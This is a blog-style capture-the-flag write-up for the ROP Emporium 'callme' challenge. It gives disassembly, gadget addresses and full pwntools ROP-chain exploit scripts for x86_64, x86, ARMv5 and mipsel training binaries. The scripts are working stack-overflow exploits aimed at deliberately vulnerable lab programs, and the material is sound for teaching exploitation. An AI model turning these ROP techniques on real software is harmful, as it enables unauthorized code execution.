--- 
layout: post 
title:  "[ROP EMPORIUM] callme"
date: "2021-05-10" 
tags: [pwn, rop, ROP-EMPORIUM] 
---

This is the third challenge of ROP EMPORIUM. In this challenge we need to call three functions in order passing it three paramether as the website told us. 

> You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

# x86_64 (64 bit) architecture

As usual we have the pwnme function and the usefulFunction

```asm
┌ 74: sym.usefulFunction ();
│           0x004008f2      55             push rbp
│           0x004008f3      4889e5         mov rbp, rsp
│           0x004008f6      ba06000000     mov edx, 6
│           0x004008fb      be05000000     mov esi, 5
│           0x00400900      bf04000000     mov edi, 4
│           0x00400905      e8e6fdffff     call sym.imp.callme_three
│           0x0040090a      ba06000000     mov edx, 6
│           0x0040090f      be05000000     mov esi, 5
│           0x00400914      bf04000000     mov edi, 4
│           0x00400919      e822feffff     call sym.imp.callme_two
│           0x0040091e      ba06000000     mov edx, 6
│           0x00400923      be05000000     mov esi, 5
│           0x00400928      bf04000000     mov edi, 4
│           0x0040092d      e8eefdffff     call sym.imp.callme_one
│           0x00400932      bf01000000     mov edi, 1                  ; int status
└           0x00400937      e814feffff     call sym.imp.exit           ; void exit(int status)
```
In order to make multiple call from our rop chain we need to use the plt section because we cannot jump directly to 0x0040092d, 0x00400919 and 0x00400905 because this will mess our stack and in our stack is placed our rop code. 

So we need the position of the plt entry for all the funtions and then a gadget that pop rdx, rsi and rdi.

This is the output of rabin for the relocation 

```

[0x00400720]> s sym.imp.callme_one 
[0x00400720]> pd 3
        ╎   ; CALL XREF from sym.usefulFunction @ 0x40092d
┌ 6: sym.imp.callme_one ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└       ╎   0x00400720      ff251a092000   jmp qword [reloc.callme_one] ; [0x601040:8]=0x400726 ; "&\a@"
        ╎   0x00400726      6805000000     push 5                      ; 5
        └─< 0x0040072b      e990ffffff     jmp sym..plt
[0x00400720]> s sym.imp.callme_two 
[0x00400740]> pd 3
        ╎   ; CALL XREF from sym.usefulFunction @ 0x400919
┌ 6: sym.imp.callme_two ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└       ╎   0x00400740      ff250a092000   jmp qword [reloc.callme_two] ; [0x601050:8]=0x400746 ; "F\a@"
        ╎   0x00400746      6807000000     push 7                      ; 7
        └─< 0x0040074b      e970ffffff     jmp sym..plt
[0x00400740]> s sym.imp.callme_three 
[0x004006f0]> pd 3
        ╎   ; CALL XREF from sym.usefulFunction @ 0x400905
┌ 6: sym.imp.callme_three ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└       ╎   0x004006f0      ff2532092000   jmp qword [reloc.callme_three] ; [0x601028:8]=0x4006f6
        ╎   0x004006f6      6802000000     push 2                      ; 2
        └─< 0x004006fb      e9c0ffffff     jmp sym..plt

```

So now we have the addresses where we want to jump in order to call the three function without using the call instruction (that will mess our stack)
we can also use into our script some pwntools sugar that could allow us not to have to search more the addresses inside plt:
```python
elf = ELF('callme')

callme_one   = elf.plt['callme_one']   
callme_two   = elf.plt['callme_two']   
callme_three = elf.plt['callme_three'] 
```
and now we need the gadget that insert the parameter into the register using inside radare2 the command /R pop :

```
  0x0040093c                 5f  pop rdi
  0x0040093d                 5e  pop rsi
  0x0040093e                 5a  pop rdx
  0x0040093f                 c3  ret
```
one of those gadget is this.

knowing that the offset in this case is of 40 bytes we have all that we need in order to solve this challenge.

```python
from pwn import *
context.binary = elf = ELF('./callme')

offset = 40

pop_rdi_rsi_rdx = 0x40093c
callme_one   = elf.plt['callme_one']   
callme_two   = elf.plt['callme_two']   
callme_three = elf.plt['callme_three'] 

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

# order argument edi esi edx 

insert_prm = p64(pop_rdi_rsi_rdx)+p64(arg1)+p64(arg2)+p64(arg3)

payload = b'A'*offset + insert_prm + p64(callme_one) + insert_prm + p64(callme_two) + insert_prm + p64(callme_three)

p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
#p.interactive
log.info(p.recvall())

```

# x86 (32 bit) architecture

in this case the solution is similar to the solution abow.
here i have wrote three solution. Pratically are the same but the sintax inside the pwntools script is different


```python
from pwn import *
context.binary = elf = ELF('./callme32')
offset = 44

callme_one   = elf.plt['callme_one']   
callme_two   = elf.plt['callme_two']   
callme_three = elf.plt['callme_three'] 

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

pop_esi_edi_ebp = 0x080487f9
pop_ebp = 0x080487fb
pop_edi_ebp = 0x080487fa

# SOLUTION 1
insert_prm = p32(pop_esi_edi_ebp)+p32(arg1)+p32(arg2)+p32(arg3)
#payload = b'A'*offset + p32(callme_one) + insert_prm + p32(callme_two) + insert_prm + p32(callme_three) + insert_prm 

# SOLUTION 2
rop = ROP(elf)
param = [0xdeadbeef, 0xcafebabe, 0xd00df00d]

rop.callme_one(*param)
rop.callme_two(*param)
rop.callme_three(*param)
#payload = b'A'*offset + rop.chain()

# SOLUTION 3
rop = ROP(elf)
rop.call('callme_one', [0xdeadbeef, 0xcafebabe, 0xd00df00d])
rop.call('callme_two', [0xdeadbeef, 0xcafebabe, 0xd00df00d])
rop.call('callme_three', [0xdeadbeef, 0xcafebabe, 0xd00df00d])

payload = b'A'*offset + rop.chain()

p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
#p.interactive
log.info(p.recvall())
```

# ARMv5 (32 bit) architecture

The main difference here is that we need to set the LR register before calling the function, so when the function return it return to the
address stored into the LR register.

In arm LR is link register used to hold the return address for a function call.

```python
from pwn import *
context.binary = elf = ELF('./callme_armv5')

''' GADGET
0x00010870      07c0bde8       pop {r0, r1, r2, lr, pc}
'''

pop_r0_r1_r2_lr_pc = 0x00010870

callme_one = elf.sym['callme_one']
callme_two = elf.sym['callme_two']
callme_three = elf.sym['callme_three']
pwnme = elf.symbols['pwnme']

offset = 36


arg = p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)
payload1 = b'A'*offset + p32(pop_r0_r1_r2_lr_pc) + arg + p32(pwnme) + p32(callme_one)
payload2 = b'A'*offset + p32(pop_r0_r1_r2_lr_pc) + arg + p32(pwnme) + p32(callme_two)  
payload3 = b'A'*offset + p32(pop_r0_r1_r2_lr_pc) + arg + p32(pwnme) + p32(callme_three) 

p = elf.process()
#p = gdb.debug(elf.path)

p.recv()

p.sendline(payload1)
# cress ctrl_c to continue the exploit
p.interactive()
p.sendline(payload2)
# cress ctrl_c to continue the exploit
p.interactive()
p.sendline(payload3)

log.info(p.recvall())
```

# mipsel (32 bit) architecture


```python
from pwn import *
context.binary = elf = ELF('callme_mipsel')

'''
0x00400bb0: lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop; 
'''

u_g = 0x00400bb0
offset = 4*9

a0 = 0xdeadbeef
a1 = 0xcafebabe
a2 = 0xd00df00d 
jump1 = elf.sym['callme_one']
jump2 = elf.sym['callme_two']
jump3 = elf.sym['callme_three']

arg = p32(a2)+p32(a1)+p32(a0)

payload = b'A'*offset + p32(u_g)+p32(0x1)+p32(jump1)+arg + p32(u_g) + p32(0x1) +p32(jump2) + arg + p32(u_g) + p32(0x1) +p32(jump3) + arg

#p = gdb.debug(elf.path)
p = elf.process()

p.recv()
p.sendline(payload)
log.info(p.recvall())
```


